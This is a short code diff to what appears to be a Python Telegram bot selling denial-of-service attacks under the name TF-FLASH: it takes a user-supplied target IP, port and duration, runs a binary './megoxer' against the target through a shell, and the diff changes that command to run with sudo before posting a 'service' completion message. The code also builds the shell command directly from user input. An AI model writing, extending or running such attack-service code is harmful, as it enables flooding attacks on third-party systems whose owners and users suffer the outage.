@@ -228,7 +228,7 @@ def TF_command(message):
         )
 
         # Log the attack started message
-        logging.info(f"Attack started by {user_name}: ./megoxer {target_ip} {target_port} {default_duration} ")
+        logging.info(f"Attack started by {user_name}:sudo ./megoxer {target_ip} {target_port} {default_duration} ")
 
         # Run the attack command with the default duration and pass the user-provided duration for the finish message
         asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name))
@@ -238,7 +238,7 @@ def TF_command(message):
 
 async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
     try:
-        command = f"./megoxer {target_ip} {target_port} {duration} "
+        command = f"sudo ./megoxer {target_ip} {target_port} {duration} "
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
         bot.send_message(CHANNEL_ID, f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 TF-FLASH™")
